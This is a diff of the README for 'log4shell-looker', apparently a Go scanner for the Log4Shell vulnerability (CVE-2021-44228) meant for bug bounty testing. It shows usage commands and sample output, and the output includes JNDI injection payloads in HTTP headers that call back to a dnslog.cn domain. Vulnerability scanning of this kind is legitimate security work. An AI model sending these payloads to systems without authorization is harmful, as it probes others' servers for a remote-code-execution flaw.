@@ -1,4 +1,4 @@
-###  log4shell-looker a log4jshell vulnerability scanner for bug bounty
+## log4shell-looker a log4jshell vulnerability scanner for bug bounty
 
 (Written in Go because, you know, "write once, run anywhere.")
 
@@ -29,17 +29,7 @@ $ go run main.go -mode=useragent -url=http://127.0.0.1:8080
 [+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
 [***] Payload :  Referer:${jndi:ldap://rfcbd0.dnslog.cn/}
 [---] Isn't to vulnerability CVE-2021-44228
-#################### 1 ############################
-[+++] Your domain generated :  rfcbd0.dnslog.cn
-[+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
-[***] Payload :  X-Forwarded-For:${jndi:ldap://rfcbd0.dnslog.cn/}
-[---] Isn't to vulnerability CVE-2021-44228
 #################### 2 ############################
-[+++] Your domain generated :  rfcbd0.dnslog.cn
-[+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
-[***] Payload :  Authentication:${jndi:ldap://rfcbd0.dnslog.cn/}
-[---] Isn't to vulnerability CVE-2021-44228
-#################### 3 ############################
 [+++] Your domain generated :  rfcbd0.dnslog.cn
 [+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
 [***] Payload :  X-Api-Version:${jndi:ldap://rfcbd0.dnslog.cn/}
@@ -58,6 +48,35 @@ Or
 go build -o main
 ```
 (Add the appropriate `.exe` extension on Windows systems, of course.)
+
+# Example 
+
+```bash 
+$ go run main.go -mode=header -url=http://127.0.0.1:8080/
+```
+![Header](https://github.com/ravro-ir/log4shell-looker/blob/main/img/header.PNG)
+
+```bash 
+$ go run main.go -mode=useragent -url=http://127.0.0.1:8080/
+```
+![Header](https://github.com/ravro-ir/log4shell-looker/blob/main/img/user_agent.PNG)
+
+```bash 
+$ go run main.go -mode=cookie -url=http://127.0.0.1:8080/
+```
+![Header](https://github.com/ravro-ir/log4shell-looker/blob/main/img/cookie.PNG)
+
+```bash 
+$ go run main.go -mode=urlpath -url=http://127.0.0.1:8080/
+```
+![Header](https://github.com/ravro-ir/log4shell-looker/blob/main/img/url_path.PNG)
+
+```bash 
+$ go run main.go -mode=contents -url=http://127.0.0.1:8080/
+```
+![Header](https://github.com/ravro-ir/log4shell-looker/blob/main/img/content_type.PNG)
+
+
 
 # License
 
